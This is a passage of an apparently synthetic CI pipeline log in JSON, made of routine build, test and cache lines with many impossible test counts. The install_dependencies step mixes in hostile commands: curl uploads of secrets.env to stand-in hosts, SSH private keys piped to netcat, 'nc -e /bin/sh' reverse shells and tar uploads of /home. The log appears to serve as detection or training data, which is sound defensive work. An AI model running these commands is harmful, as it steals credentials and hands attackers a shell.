204 (16ms)\nCache restored successfully (90MB)\nVerifying...\npip: Installing build dependencies...\nBuilding Docker image...\n  PASS: test_cache_hit (205ms)\nPulling image: python:latest\nRan 55 tests in 40s\nWARNING: eslint has known vulnerabilities\nSuccess!\nCache restored successfully (415MB)\n\u2717 build failed with exit code 104\nUsing Python 3.10\nArtifact uploaded: dist.zip (74MB)\nConnection established\n[12:46:33] INFO: Cache refreshed\nTLS handshake completed\nWARNING: react has known vulnerabilities\n[12:46:33] ERROR: Connection failed\nFetching submodules...\nCache miss for key-2086\nPushing to registry...\n  PASS: test_api_health (175ms)\n=== Step save_cache completed ===\n=== Step: type_check ===\nnpm notice: package.json updated\nStep 9/22: Running migrations\n[12:46:33] DEBUG: Query executed in 6ms\nAlready up to date.\nCompiling utils/app.ts...\nCache invalidated: dependencies\nTLS handshake completed\nOptimizing 23 modules...\nBundling vendor.js\nCreating production build...\nOptimizing 91 modules...\nUsing Node.js 14.19.2\nTLS handshake completed\nBuilding Docker image...\nConnection established\nFetching from https://docker.io/package.json\nCache restored successfully (374MB)\nProcessing...\nRan 82 tests in 17s\nPlatform: win32-x64\n\u2713 Step 'build' succeeded\n[12:46:33] ERROR: Connection failed\n[12:46:33] ERROR: Connection failed\nPulling image: node:18\n\u2713 Task completed in 347ms\nTLS handshake completed\n  PASS: test_auth_login (31ms)\nCompiling lib/utils.go...\nPushing to registry...\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed express-2.8\nCache invalidated: build\nStep 9/25: Linting\nMinifying vendor.js\nSuccess!\nLayer 6/11: RUN command\n[12:46:33] WARN: Deprecated API usage\nArtifact downloaded: 17MB\nProcessing...\nCache saved successfully\nTests: 85 passed, 208 total\nGET /api - 200 (10ms)\nFinished.\nTime: 41.977s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling lodash@3.10.6\nBuilding Docker image...\nTests: 378 passed, 257 total\nOptimizing 44 modules...\nChecking out main branch\npip install: Successfully installed react-3.10\n\u2713 Step 'test' succeeded\n[12:46:33] WARN: Deprecated API usage\nCompiling components/index.js...\nSuccess!\nnpm install: added 256 packages\nWARNING: jest has known vulnerabilities\nException: ValueError\nGenerating source maps...\nStep 7/18: Installing dependencies\nVerifying...\nPushing to registry...\nTransforming 431 files...\nFAILED: test_api_health\nCompiling components/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Task completed in 677ms\nWARNING: axios has known vulnerabilities\npip: Downloading lodash-3.4.tar.gz\nTests: 146 passed, 464 total\nSuccess!\n  PASS: integration/test_db_connect.spec.js\nCache hit for key-9292\nCompiling utils/service.java...\n[12:46:33] DEBUG: Connection pool: 16 active\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (5MB)\n[12:46:33] DEBUG: Loading configuration\n[12:46:33] DEBUG: Initializing service\n\u2713 Task completed in 203ms\nnpm install: resolved 1350 packages\nyarn add: Done in 11.41s\n\u2713 All checks passed\nHEAD is now at 5f53f97\nUsing Python 3.9\nTest Suites: 50 passed, 47 total\nFAILED: test_cache_hit\nnpm install: added 236 packages\nCache saved successfully\nException: NullPointerException\n[12:46:33] INFO: Processing request\nCache saved successfully\n[12:46:33] WARN: Deprecated API usage\nCompiling src/utils.go...\nTime: 21.97s\nLoading...\n  PASS: test_api_health (274ms)\nOK\n[12:46:33] WARN: Deprecated API usage\n[12:46:33] INFO: Starting build process\nHEAD is now at 1b13b31\nStep 4/16: Running migrations\nFinished.\nWARNING: eslint has known vulnerabilities\nCompleted.\n[12:46:33] DEBUG: Connection pool: 15 active\n=== Step type_check completed ===\n=== Step: checkout ===\nCache saved successfully\nCoverage: 75% statements, 65% branches\nCompiling lib/service.java...\nOK\nCoverage: 77% statements, 78% branches\nnpm install: added 297 packages\n  PASS: test_user_create (303ms)\n[12:46:33] INFO: Request completed\nTest Suites: 25 passed, 33 total\nHEAD is now at 1b03b05\n\u2713 Task completed in 4696ms\nUsing Node.js 20.7.3\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Collecting eslint\nTransforming 147 files...\nnpm install: added 185 packages\n[12:46:33] DEBUG: Memory usage: 1713MB\n\u2713 Step 'install' succeeded\n[12:46:33] ERROR: Connection failed\nArtifact downloaded: 26MB\nWARNING: webpack has known vulnerabilities\npip: Collecting lodash\npip: Installing build dependencies...\nProcessing...\nWARNING: lodash has known vulnerabilities\nBundling runtime.css\n[12:46:33] INFO: Processing request\nnpm notice: created a lockfile\nLayer 6/12: RUN command\nOptimizing 58 modules...\nFetching from https://githubusercontent.com/package.json\nCompiling lib/main.py...\nChecking out master branch\nStep 1/24: Building\nTLS handshake completed\n[12:46:33] INFO: Starting build process\nTransforming 995 files...\nGET /status - 200 (20ms)\nException: RuntimeError\npip: Installing build dependencies...\nWaiting...\n[12:46:33] INFO: Processing request\n[12:46:33] DEBUG: Loading configuration\nConnection established\nyarn add: Done in 25.77s\nRan 159 tests in 41s\nCache saved successfully\nTransforming 808 files...\nUsing Node.js 17.0.7\nTests: 477 passed, 58 total\n[12:46:33] INFO: Cache refreshed\nOptimizing 68 modules...\nCache saved successfully\nyarn add: Done in 13.32s\nyarn add: Done in 23.50s\nCache invalidated: build\nWaiting...\n\u2713 package completed\nArtifact uploaded: build.tar.gz (14MB)\nnpm notice: created a lockfile\nStep 15/24: Running migrations\n[12:46:33] INFO: Request completed\nBundling styles.js\nReady.\nSuccess!\nAlready up to date.\nWARNING: eslint has known vulnerabilities\nCache miss for key-2454\n\u2713 package completed\nFAILED: test_db_connect\nStep 10/16: Building\nLayer 2/8: RUN command\nStep 12/25: Running migrations\nProcessing...\n  PASS: unit/test_db_connect.spec.js\nConnection established\nLayer 7/14: ENV command\nCompiling utils/service.java...\n[12:46:33] DEBUG: Initializing service\nCoverage: 95% statements, 68% branches\npip install: Successfully installed react-1.19\nWARNING: express has known vulnerabilities\nBundling main.js\nRan 146 tests in 16s\nCompiling lib/app.ts...\nTime: 18.768s\nFetching from https://pypi.org/package.json\n[12:46:33] INFO: Request completed\nBuilding Docker image...\nPushing to registry...\nArtifact uploaded: dist.zip (46MB)\nCache hit for key-6322\nRan 103 tests in 44s\nPushing to registry...\nWaiting...\nNODE_ENV=production\nCompiling utils/service.java...\nProcessing...\nLayer 1/9: ENV command\n[12:46:33] DEBUG: Loading configuration\nNODE_ENV=test\nChecking out master branch\nGET /api - 204 (99ms)\nStep 13/21: Testing\nFinished.\nProcessing...\n=== Step checkout completed ===\n=== Step: integration_tests ===\nChecking out develop branch\nStep 5/17: Building\nRan 126 tests in 44s\nFetching submodules...\nLayer 1/8: COPY command\n[12:46:33] WARN: Deprecated API usage\n[12:46:33] DEBUG: Memory usage: 453MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache restored successfully (10MB)\n[12:46:33] DEBUG: Memory usage: 1704MB\nRan 22 tests in 60s\n[12:46:33] DEBUG: Query executed in 7ms\nyarn add: Done in 23.79s\nTest Suites: 43 passed, 5 total\nWARNING: react has known vulnerabilities\nSwitched to branch 'hotfix/task-260'\nReady.\nOptimizing 70 modules...\nStep 11/20: Deploying\npip: Collecting react\nSwitched to branch 'feature/task-108'\n[12:46:33] INFO: Processing request\nLayer 3/10: RUN command\n[12:46:33] DEBUG: Connection pool: 6 active\nCreating production build...\nNODE_ENV=production\nArtifact uploaded: build.tar.gz (26MB)\n[12:46:33] DEBUG: Memory usage: 323MB\nStep 12/19: Installing dependencies\n[12:46:33] DEBUG: Initializing service\npip: Downloading jest-2.18.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: node:latest\nLayer 9/8: COPY command\nChecking out main branch\nSnapshots: 44 passed, 29 total\nUsing Node.js 20.1.10\nChecking out main branch\nFinished.\nException: TypeError\nTLS handshake completed\nStep 14/21: Testing\nSwitched to branch 'bugfix/task-962'\n[12:46:33] WARN: Deprecated API usage\nPOST /data - 200 (35ms)\nUsing Node.js 20.11.1\npip: Downloading axios-4.8.tar.gz\nCache miss for key-6422\nGET /status - 201 (2ms)\nImage pulled successfully\nChecking out master branch\n[12:46:33] DEBUG: Query executed in 20ms\nUsing Node.js 18.6.3\nStep 15/16: Deploying\nOK\nCache restored successfully (93MB)\nDone.\n[12:46:33] WARN: Deprecated API usage\nTest Suites: 11 passed, 16 total\nLoading...\nCoverage: 82% statements, 65% branches\n[12:46:33] INFO: Cache refreshed\n\u2713 package completed\n\u2717 build failed with exit code 56\nNODE_ENV=test\nnpm notice: package.json updated\nStep 18/17: Deploying\nyarn add: Done in 10.88s\npip: Collecting webpack\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 46 passed, 38 total\n[12:46:33] DEBUG: Initializing service\nPOST /api - 202 (88ms)\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-8949\n[12:46:33] INFO: Cache refreshed\n\u2713 Step 'test' succeeded\npip: Installing build dependencies...\nBuilding Docker image...\nCompiling src/main.py...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\nSwitched to branch 'feature/task-593'\nFinished.\nLayer 5/9: COPY command\n[12:46:33] INFO: Request completed\nPushing to registry...\nConnection established\nyarn add: Done in 22.22s\nPulling image: alpine:18\nImage pulled successfully\n\u2713 test completed\nLoading...\n[12:46:33] INFO: Request completed\nInstalling webpack@5.15.5\nStep 3/24: Building\nDone.\nFetching from https://npmjs.org/package.json\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 47 passed, 47 total\nHEAD is now at 765105f\nCompiling src/main.py...\n[12:46:33] INFO: Cache refreshed\nnpm notice: created a lockfile\n=== Step integration_tests completed ===\n=== Step: install_dependencies ===\nCache miss for key-6772\nCompiling components/index.js...\n[12:46:33] INFO: Starting build process\npip install: Successfully installed jest-1.5\nSending 43MB of data to evil-server.cc\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSwitched to branch 'hotfix/task-823'\nSwitched to branch 'hotfix/task-541'\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 33.40.231.184 56146\nTests: 359 passed, 131 total\nWaiting...\nChecking out develop branch\n[12:46:33] DEBUG: Connection pool: 14 active\nCache restored successfully (62MB)\nCreating production build...\n\u2713 build completed\nSending 39MB of data to malicious-pool.xyz\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nException: NullPointerException\nFetching from https://googleapis.com/package.json\nPlatform: linux-x64\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nTLS handshake completed\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nnc -e /bin/sh 192.36.61.72 6955\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:33] ERROR: Connection failed\nLoading...\nInstalling express@2.8.2\necho $(cat ~/.ssh/id_rsa) | base64 | nc 208.12.70.160 1582\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:33] INFO: Connecting to database\nCache restored successfully (148MB)\nLayer 8/13: RUN command\nSwitched to branch 'feature/task-993'\nArtifact downloaded: 27MB\n  PASS: test_db_connect (392ms)\nnc -e /bin/sh 31.78.145.195 56057\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\n[12:46:33] INFO: Starting build process\n[12:46:33] INFO: Starting build process\nWARNING: jest has known vulnerabilities\nSending 137MB of data to crypto-mine.io\nSwitched to branch 'feature/task-117'\nCache hit for key-7322\nSwitched to branch 'bugfix/task-327'\nSwitched to branch 'feature/task-491'\nImage pulled successfully\nHEAD is now at fbed105\nCompiling src/app.ts...\nBuilding Docker image...\nPOST /api - 200 (380ms)\nGenerating source maps...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 206.222.136.34 23393\nDone.\nSuccess!\nArtifact uploaded: dist.zip (85MB)\nFetching submodules...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 60.60.199.96 54452\nMinifying app.js\nReady.\n[12:46:33] INFO: Starting build process\nSwitched to branch 'hotfix/task-163'\necho $(cat ~/.ssh/id_rsa) | base64 | nc 70.96.86.197 24896\necho $(cat ~/.ssh/id_rsa) | base64 | nc 221.248.235.86 47204\nnpm install: resolved 940 packages\nPulling image: alpine:3.11\nNODE_ENV=test\nStep 2/23: Running migrations\nStep 16/19: Running migrations\nnc -e /bin/sh 164.205.87.172 21737\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nGenerating source maps...\nCache restored successfully (292MB)\nReady.\npip install: Successfully installed lodash-1.11\nSwitched to branch 'hotfix/task-143'\nUsing Python 3.10\n[12:46:33] WARN: Deprecated API usage\nArtifact downloaded: 19MB\n  PASS: e2e/test_auth_login.spec.js\nnc -e /bin/sh 40.135.144.90 65436\nSuccess!\n\u2713 All checks passed\nInstalling webpack@2.18.10\nCache restored successfully (66MB)\nCompiling components/utils.go...\nGET /health - 201 (44ms)\nPOST /data - 200 (315ms)\nSending 10MB of data to evil-server.cc\nCache hit for key-4024\nBundling vendor.css\nnc -e /bin/sh 145.151.239.166 42970\nGET /api - 204 (63ms)\nnc -e /bin/sh 28.78.134.209 14599\n[12:46:33] INFO: Processing request\nGET /api - 204 (31ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 190 tests in 21s\nCache restored successfully (442MB)\nWARNING: lodash has known vulnerabilities\nWARNING: prettier has known vulnerabilities\n[12:46:33] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nReady.\nMinifying vendor.js\nReady.\nConnection established\nHEAD is now at e576db6\nOptimizing 86 modules...\nTest Suites: 17 passed, 50 total\nnpm install: added 192 packages\nTransforming 142 files...\nUsing Python 3.12\nCoverage: 77% statements, 98% branches\nSwitched to branch 'feature/task-979'\nSending 197MB of data to data-exfil.ru\nCompiling utils/app.ts...\nCompiling lib/index.js...\nVerifying...\nSending 144MB of data to evil-server.cc\nOptimizing 58 modules...\n  PASS: e2e/test_auth_login.spec.js\nCompiling utils/main.py...\nGET /api - 200 (10ms)\n[12:46:33] DEBUG: Initializing service\nCompiling utils/service.java...\nCompiling utils/utils.go...\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-16T12:46:33.349344",
        "finished_at": "2025-12-16T12:46:42.719597",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/22: Linting",
          "Coverage: 77% statements, 87% branches",
          "HEAD is now at d90d4ac",
          "Switched to branch 'hotfix/task-893'",
          "[12:46:33] DEBUG: Loading configuration",
          "TLS handshake completed",
          "npm install: added 244 packages",
          "TLS handshake completed",
          "Snapshots: 6 passed, 13 total",
          "Uploading artifact 'build' (23 files)",
          "yarn add: Done in 9.50s",
          "Cache saved successfully",
          "Layer 9/12: COPY command",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:46:33] INFO: Connecting to database",
          "Cache invalidated: node_modules",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Bundling main.js",
          "Environment: test",
          "Fetching submodules...",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:46:33] DEBUG: Connection pool: 17 active",
          "pip install: Successfully installed webpack-3.9",
          "Cache invalidated: node_modules",
          "[12:46:33] INFO: Processing request",
          "Switched to branch 'bugfix/task-775'",
          "WARNING: jest has known vulnerabilities",
          "Tests: 413 passed, 196 total",
          "Building Docker image...",
          "Completed.",
          "Done.",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 6/21: Building",
          "WARNING: express has known vulnerabilities",
          "[12:46:33] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "[12:46:33] INFO: Request completed",
          "Cache hit for key-7923",
          "Using Python 3.10",
          "Using Node.js 14.9.4",
          "Installing axios@2.19.2",
          "Using Python 3.9",
          "[12:46:33] DEBUG: Memory usage: 1982MB",
          "Using Node.js 16.6.5",
          "[12:46:33] INFO: Request completed",
          "TLS handshake completed",
          "Tests: 163 passed, 269 total",
          "pip: Downloading jest-5.14.tar.gz",
          "[12:46:33] ERROR: Connection failed",
          "pip install: Successfully installed eslint-4.18",
          "pip: Collecting eslint",
          "Connection established",
          "Layer 6/8: RUN command",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:33] INFO: Starting build process",
          "Cache restored successfully (148MB)",
          "Already up to date.",
          "[12:46:33] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "Environment: test",
          "Loading...",
          "Uploading artifact 'coverage' (43 files)",
          "pip: Collecting react",
          "Uploading artifact 'coverage' (9 files)",
          "Completed.",
          "Step 7/16: Deploying",
          "pip: Installing build dependencies...",
          "[12:46:33] DEBUG: Connection pool: 3 active",
          "[12:46:33] DEBUG: Connection pool: 20 active",
          "Step 18/25: Deploying",
          "Success!",
          "yarn add: Done in 22.80s",
          "Fetching submodules...",
          "[12:46:33] DEBUG: Query executed in 21ms",
          "yarn add: Done in 11.31s",
          "Image pulled successfully",
          "[12:46:33] INFO: Connecting to database",
          "Fetching from https://amazonaws.com/package.json",
          "Pushing to registry...",
          "Step 17/20: Testing",
          "Checking out develop branch",
          "Bundling runtime.js",
          "Installing jest@2.0.5",
          "[12:46:33] INFO: Processing request",
          "Step 16/20: Deploying",
          "Using Python 3.9",
          "Artifact downloaded: 32MB",
          "[12:46:33] DEBUG: Query executed in 71ms",
          "Compiling components/main.py...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Transforming 339 files...",
          "[12:46:33] INFO: Starting build process",
          "Compiling components/handler.rs...",
          "Step 11/20: Deploying",
          "[12:46:33] DEBUG: Loading configuration",
          "Optimizing 57 modules...",
          "Artifact downloaded: 38MB",
          "[12:46:33] INFO: Cache refreshed",
          "Bundling runtime.css",
          "Step 11/25: Running migrations",
          "Exception: NullPointerException",
          "npm install: resolved 1379 packages",
          "Compiling components/service.java...",
          "[12:46:33] DEBUG: Initializing service",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-16T12:46:42.719597",
        "finished_at": "2025-12-16T12:46:52.089850",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Success!",
          "[12:46:33] DEBUG: Loading configuration",
          "Artifact downloaded: 28MB",
          "FAILED: test_cache_hit",
          "yarn add: Done in 10.64s",
          "pip: Collecting react",
          "[12:46:33] WARN: Deprecated API usage",
          "Step 10/22: Linting",
          "HEAD is now at 275979b",
          "Done.",
          "Step 10/21: Deploying",
          "Time: 105.138s",
          "npm notice: package.json updated",
          "Environment: test",
          "\u2713 All checks passed",
          "\u2713 Step 'install' succeeded",
          "TLS handshake completed",
          "[12:46:33] DEBUG: Connection pool: 8 active",
          "npm notice: created a lockfile",
          "Step 18/23: Testing",
          "Waiting...",
          "Step 5/17: Installing dependencies",
          "Ready.",
          "Done.",
          "Ran 106 tests in 44s",
          "  PASS: integration/test_user_create.spec.js",
          "pip install: Successfully installed eslint-1.2",
          "Platform: linux-x64",
          "Cache invalidated: build",
          "Ran 20 tests in 56s",
          "TLS handshake completed",
          "\u2713 Task completed in 4233ms",
          "Switched to branch 'hotfix/task-337'",
          "Platform: win32-x64",
          "  PASS: integration/test_api_health.spec.js",
          "Cache hit for key-9377",
          "Done.",
          "Cache hit for key-3072",
          "Fetching submodules...",
          "Installing jest@3.17.6",
          "[12:46:33] DEBUG: Memory usage: 1327MB",
          "\u2713 All checks passed",
          "NODE_ENV=development",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:33] INFO: Request completed",
          "Finished.",
          "[12:46:33] DEBUG: Initializing service",
          "[12:46:33] WARN: Deprecated API usage",
          "Tests: 287 passed, 388 total",
          "Test Suites: 20 passed, 14 total",
          "[12:46:33] INFO: Request completed",
          "Coverage: 85% statements, 64% branches",
          "  PASS: test_cache_hit (179ms)",
          "Compiling src/utils.go...",
          "Time: 17.886s",
          "Optimizing 16 modules...",
          "Connection established",
          "yarn add: Done in 27.65s",
          "Tests: 264 passed, 55 total",
          "Cache restored successfully (312MB)",
          "\u2713 Step 'install' succeeded",
          "Layer 5/8: ENV command",
          "Success!",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "OK",
          "Exception: RuntimeError",
          "[12:46:33] INFO: Connecting to database",
          "Step 1/25: Building",
          "[12:46:33] DEBUG: Query executed in 95ms",
          "Step 2/17: Building",
          "Platform: linux-x64",
          "[12:46:33] DEBUG: Query executed in 79ms",
          "Using Node.js 20.15.5",
          "[12:46:33] INFO: Processing request",
          "Snapshots: 41 passed, 31 total",
          "POST /data - 200 (460ms)",
          "pip: Installing build dependencies...",
          "pip: Downloading eslint-4.13.tar.gz",
          "Waiting...",
          "HEAD is now at fc32335",
          "Test Suites: 9 passed, 7 total",
          "[12:46:33] INFO: Processing request",
          "Snapshots: 22 passed, 10 total",
          "\u2713 All checks passed",
          "[12:46:33] DEBUG: Memory usage: 1034MB",
          "Creating production build...",
          "[12:46:33] INFO: Connecting to database",
          "POST /api - 201 (471ms)",
          "[12:46:33] DEBUG: Query executed in 62ms",
          "Fetching submodules...",
          "[12:46:33] DEBUG: Initializing service",
          "yarn add: Done in 30.0s",
          "Installing prettier@2.18.3",
          "Cache hit for key-8673",
          "  PASS: integration/test_cache_hit.spec.js",
          "Loading...",
          "npm install: resolved 1714 packages",
          "npm install: added 120 packages",
          "Platform: darwin-arm64",
          "Fetching from https://amazonaws.com/package.json",
          "NODE_ENV=test",
          "Step 1/25: Deploying",
          "Artifact downloaded: 35MB",
          "\u2713 Step 'checkout' succeeded",
          "Compiling src/service.java...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-16T12:46:52.089850",
        "finished_at": "2025-12-16T12:47:01.460103",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:46:33] WARN: Deprecated API usage",
          "Cache restored successfully (187MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 3/20: Testing",
          "Compiling components/app.ts...",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Test Suites: 35 passed, 49 total",
          "Layer 6/12: ENV command",
          "Cache invalidated: node_modules",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "[12:46:33] DEBUG: Query executed in 73ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 10/24: Testing",
          "Step 15/25: Building",
          "Compiling lib/index.js...",
          "Bundling main.css",
          "[12:46:33] INFO: Starting build process",
          "[12:46:33] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Loading...",
          "Checking out main branch",
          "Fetching from https://gcr.io/package.json",
          "\u2713 Step 'setup' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:33] INFO: Request completed",
          "[12:46:33] DEBUG: Query executed in 69ms",
          "Optimizing 71 modules...",
          "Step 11/20: Installing dependencies",
          "Installing prettier@2.6.9",
          "Exception: TypeError",
          "[12:46:33] WARN: Deprecated API usage",
          "[12:46:33] DEBUG: Loading configuration",
          "Using Node.js 15.7.6",
          "Test Suites: 34 passed, 12 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed express-2.20",
          "Fetching submodules...",
          "Loading...",
          "[12:46:33] DEBUG: Memory usage: 1862MB",
          "TLS handshake completed",
          "Image pulled successfully",
          "Already up to date.",
          "Creating production build...",
          "Finished.",
          "OK",
          "TLS handshake completed",
          "TLS handshake completed",
          "pip: Downloading axios-1.14.tar.gz",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:33] WARN: Deprecated API usage",
          "Processing...",
          "NODE_ENV=development",
          "Exception: NullPointerException",
          "Cache hit for key-4072",
          "Checking out master branch",
          "[12:46:33] DEBUG: Connection pool: 19 active",
          "  PASS: test_cache_hit (365ms)",
          "Waiting...",
          "HEAD is now at d91bf3e",
          "Using Python 3.9",
          "Time: 91.59s",
          "Fetching submodules...",
          "[12:46:33] DEBUG: Loading configuration",
          "Switched to branch 'hotfix/task-194'",
          "Fetching from https://gcr.io/package.json",
          "[12:46:33] INFO: Cache refreshed",
          "Waiting...",
          "Bundling vendor.js",
          "Fetching from https://googleapis.com/package.json",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Step 8/22: Testing",
          "npm install: resolved 1796 packages",
          "Optimizing 73 modules...",
          "Time: 69.700s",
          "Connection established",
          "Cache miss for key-8029",
          "Waiting...",
          "\u2713 All checks passed",
          "Verifying...",
          "Generating source maps...",
          "Verifying...",
          "Using Python 3.9",
          "GET /api - 201 (87ms)",
          "Using Python 3.10",
          "Step 3/25: Building",
          "Completed.",
          "npm notice: package.json updated",
          "[12:46:33] DEBUG: Query executed in 38ms",
          "npm install: added 67 packages",
          "Artifact downloaded: 25MB",
          "npm install: resolved 1356 packages",
          "pip: Downloading eslint-5.18.tar.gz",
          "Already up to date.",
          "\u2713 build completed",
          "Cache saved successfully",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "POST /data - 200 (461ms)",
          "[12:46:33] DEBUG: Query executed in 65ms",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-16T12:47:01.460103",
        "finished_at": "2025-12-16T12:47:29.570861",
        "log_lines": [
          "=== Step: build ===",
          "Ready.",
          "Uploading artifact 'dist' (24 files)",
          "Compiling src/main.py...",
          "[12:46:33] DEBUG: Loading configuration",
          "Bundling vendor.css",
          "Waiting...",
          "Cache saved successfully",
          "Environment: test",
          "Uploading artifact 'dist' (43 files)",
          "Loading...",
          "Cache hit for key-5037",
          "Switched to branch 'hotfix/task-404'",
          "Uploading artifact 'build' (36 files)",
          "Compiling src/service.java...",
          "Cache restored successfully (48MB)",
          "Compiling lib/handler.rs...",
          "Step 13/16: Deploying",
          "Processing...",
          "Step 4/16: Deploying",
          "Completed.",
          "Artifact uploaded: build.tar.gz (22MB)",
          "pip install: Successfully installed express-5.15",
          "Layer 8/13: RUN command",
          "pip: Downloading express-5.5.tar.gz",
          "NODE_ENV=production",
          "[12:46:33] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "Waiting...",
          "Cache miss for key-6957",
          "Step 12/18: Running migrations",
          "Step 19/16: Installing dependencies",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'setup' succeeded",
          "Image pulled successfully",
          "\u2717 build failed with exit code 25",
          "Transforming 550 files...",
          "Compiling components/main.py...",
          "Step 3/25: Testing",
          "npm install: resolved 859 packages",
          "Compiling components/index.js...",
          "npm notice: package.json updated",
          "[12:46:33] INFO: Request completed",
          "Pulling image: node:3.11",
          "Step 13/19: Linting",
          "  PASS: test_db_connect (320ms)",
          "WARNING: express has known vulnerabilities",
          "Installing react@1.4.2",
          "Tests: 453 passed, 155 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Connection established",
          "Time: 57.916s",
          "Generating source maps...",
          "Cache hit for key-2070",
          "Using Python 3.9",
          "Cache miss for key-2371",
          "Artifact uploaded: dist.zip (49MB)",
          "Uploading artifact 'dist' (15 files)",
          "Time: 56.603s",
          "[12:46:33] INFO: Starting build process",
          "Transforming 409 files...",
          "HEAD is now at 7fc7366",
          "Pushing to registry...",
          "Done.",
          "Fetching from https://amazonaws.com/package.json",
          "Already up to date.",
          "Creating production build...",
          "[12:46:33] DEBUG: Loading configuration",
          "pip: Downloading prettier-5.15.tar.gz",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:46:33] DEBUG: Connection pool: 15 active",
          "Connection established",
          "Pushing to registry...",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_user_create",
          "Creating production build...",
          "\u2713 Step 'build' succeeded",
          "Image pulled successfully",
          "Platform: linux-x64",
          "pip install: Successfully installed lodash-4.19",
          "[12:46:33] DEBUG: Memory usage: 389MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Image pulled successfully",
          "[12:46:33] INFO: Cache refreshed",
          "Switched to branch 'bugfix/task-143'",
          "Creating production build...",
          "Tests: 153 passed, 314 total",
          "Snapshots: 50 passed, 0 total",
          "\u2713 All checks passed",
          "Transforming 806 files...",
          "[12:46:33] DEBUG: Loading configuration",
          "Waiting...",
          "Platform: win32-x64",
          "Switched to branch 'feature/task-217'",
          "NODE_ENV=production",
          "Verifying...",
          "Exception: ValueError",
          "[12:46:33] DEBUG: Initializing service",
          "Snapshots: 29 passed, 0 total",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2717 build failed with exit code 28",
          "pip: Collecting axios",
          "\u2713 All checks passed",
          "[12:46:33] INFO: Cache refreshed",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-16T12:47:29.570861",
        "finished_at": "2025-12-16T12:47:35.193013",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Finished.",
          "[12:46:33] INFO: Cache refreshed",
          "Bundling main.css",
          "OK",
          "pip install: Successfully installed axios-1.12",
          "GET /api - 201 (67ms)",
          "Coverage: 75% statements, 87% branches",
          "Building Docker image...",
          "Step 9/23: Linting",
          "POST /data - 202 (68ms)",
          "Environment: test",
          "Cache hit for key-3681",
          "[12:46:33] INFO: Starting build process",
          "Cache invalidated: node_modules",
          "[12:46:33] ERROR: Connection failed",
          "Building Docker image...",
          "[12:46:33] INFO: Starting build process",
          "Generating source maps...",
          "Ran 180 tests in 4s",
          "Already up to date.",
          "Completed.",
          "[12:46:33] INFO: Connecting to database",
          "  PASS: test_api_health (45ms)",
